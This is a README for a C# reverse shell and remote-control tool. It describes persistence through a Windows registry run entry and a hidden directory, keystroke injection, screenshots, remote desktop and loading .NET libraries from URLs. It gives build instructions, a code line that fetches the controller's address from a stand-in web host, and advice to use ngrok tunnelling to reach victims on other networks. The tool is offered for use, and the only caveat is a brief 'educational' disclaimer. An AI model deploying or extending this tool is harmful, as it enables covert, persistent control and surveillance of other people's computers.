# README.MD
### Project Description
This project is a demonstration of a reverse shell written in C#. It is a powerful tool for remote system management, intended for educational and research purposes.

#### Key Code Features
1. Network Connection: The code uses the TcpClient class to establish a network connection with a remote server. The server's IP address and port are retrieved from a remote web server.

2. Cryptography: To ensure communication security, the code utilizes the SHA256 hashing algorithm and XOR encryption, along with RSA encryption for end-to-end encryption. The keys are regenerated for each iteration to enhance security.

3. Command Handling: The code can read commands from a process's standard output stream and send them to the server. It can also read commands from the server and execute them on the local machine.

4. Additional Functionality: The code includes additional features such as sending keyboard keystrokes, displaying message boxes, executing commands asynchronously, capturing remote screenshots, and loading .NET libraries from URLs.

5. Persistence: The code attempts to make the reverse shell persistent by adding an entry to the Windows registry to execute the program during the user's session startup. It also copies the executable file into a hidden directory.

#### Usage
To download .NET 7.0 as a portable version, see here: Download .NET 7.0 SDK

Direct link: dotnet-sdk-7.0.306-win-x64.zip

#### Compile the Client:
To get started, change the URL at line 158 of client\Program.cs:

```csharp
string ip_port = new WebClient().DownloadString("https://outofhere.example.repl.co/");  // replace by YOUR WebServer url
```
Then, compile the client using dotnet.exe:

```cmd / powershell
dotnet.exe publish client.csproj
```
The single-file binary can be found at:
```path
client\bin\Debug\net7.0-windows\win-x64\publish
```
Next, publish the server:

```cmd / powershell
dotnet.exe publish server.csproj
```
The single-file binary can be found at:

```path
server\bin\Debug\net7.0-windows\win-x64\publish
```
To connect to the server from a network other than the client's, it is recommended to use the ngrok tunneling service and add the IP address and port to a web server with a fixed domain (e.g., on a Repl.it HTML, CSS, JS on https://replit.com).

// The IP address and port must be separated by a colon only.

Example:

```IP:Port
1.2.3.4:8080
```
### Demonstration
#### For information, the videos were recorded on the same machine with real-time threat protection enabled [without sending samples], but it is indeed CLIENT.EXE that performs the actions.

##### - reverse shell
If You Don't see : <a target="_blank" href="https://github.com/Olivier-true/revserse-shell/blob/main/reverse_shell.gif?raw=true">reverse_shell.gif</a>
<img src="https://github.com/Olivier-true/revserse-shell/blob/main/reverse_shell.gif?raw=true">

##### - MessageBox and SendKeys
If You Don't see : https://raw.githubusercontent.com/Olivier-true/revserse-shell/main/send_keys_and_msgb.gif
<img src="https://raw.githubusercontent.com/Olivier-true/revserse-shell/main/send_keys_and_msgb.gif">
<br> example of command
msgb>/Your Message
SKS>/Your Keys

##### - remote-desktop
#### check for in this repositery remote-desktop.gif
<br> For remote-desktop start server-remote-video.exe in remote-video\server-remote-video\server\bin\Debug
<img src="https://github.com/Olivier-true/revserse-shell/blob/main/remote-desktop.gif?raw=true">
and execute the command on server.exe :
remote-desktop>/<Your IP Address>:8081

#### Disclaimer
This project is published for educational and research purposes. The author is not responsible for any misuse of this tool.


<p align="center"><img src="https://ipipip-gh.0xsql.repl.co/reverse-shell/views.png" alt="Visitors"></a></p>

##### Donate ☕
<a target="_blank" style="color: blue; text-decoration: none;" href="https://paypal.me/L3glight"><img src="https://cdn3.emoji.gg/emojis/1716_PAYPAL.png" width="16" height="16">&nbsp;&nbsp;Paypal</a>
